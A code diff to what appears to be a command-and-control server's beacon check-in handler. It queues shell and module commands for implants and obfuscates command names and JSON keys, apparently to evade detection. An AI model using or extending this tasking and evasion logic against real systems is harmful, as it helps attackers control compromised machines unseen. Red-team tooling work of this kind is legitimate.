@@ -34,21 +34,44 @@ def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
 
     # Check for commands to send
     commands_to_send = []
+    # Safely get commands mapping from obfuscation_map
+    command_obf = obfuscation_map.get("generic", {}).get("commands", {})
     for cmd_id, command in command_list.items():
         if command.beacon_uuid == beacon_id and not command.executed:
             command.output = "Sent to beacon, waiting for response."
+            obfuscated_command = None
+            try:
+                # Try top-level lookup case-insensitively
+                obf_entry = obfuscation_map.get(command.command) or obfuscation_map.get(command.command.lower())
+                if obf_entry is None:
+                    generic_commands = obfuscation_map.get("generic", {}).get("commands", {})
+                    obf_entry = generic_commands.get(command.command) or generic_commands.get(command.command.lower())
+                if isinstance(obf_entry, dict):
+                    obfuscated_command = obf_entry.get('obfuscation_name') or obf_entry.get('module_name')
+                    if obfuscated_command is None:
+                        logger.error(f"Obfuscation entry for command '{command.command}' missing expected name keys")
+                        continue
+                elif isinstance(obf_entry, str):
+                    obfuscated_command = obf_entry
+                else:
+                    logger.error(f"Obfuscation entry for command '{command.command}' is missing or has unexpected type: {type(obf_entry)}")
+                    continue
+            except Exception as e:
+                logger.error(f"Error obfuscating command '{command.command}': {e}")
+                continue
             commands_to_send.append({
-                "command_uuid": cmd_id,
-                "command": command.command,
-                "data": command.command_data
+                command_obf.get("command_uuid"): cmd_id,
+                command_obf.get("command"): obfuscated_command,
+                command_obf.get("data"): getattr(command, "command_data", None)
             })
             command.executed = True
-        if command.command == obfuscation_map.get("commands", {}).get("module"):
-            command.data = "Module Sent"  
-        if command.command == obfuscation_map.get("commands", {}).get("shell"):
-            command.data = "Shell Sent"  
+        if command.command == "Module":
+            command.data = "Module Sent"
+        if command.command == "Shell":
+            command.data = "Shell Sent"
 
-    response_data = {"commands": commands_to_send} if commands_to_send else {obfuscation_map.get("commands", {}).get("none"): obfuscation_map.get("commands", {}).get("none")}
+    none_key = command_obf.get("none").get("obfuscation_name")
+    response_data = {command_obf.get("obfuscation_name"): commands_to_send} if commands_to_send else {none_key: none_key}
     response_body = json.dumps(response_data).encode('utf-8')
 
     handler.send_response(200)
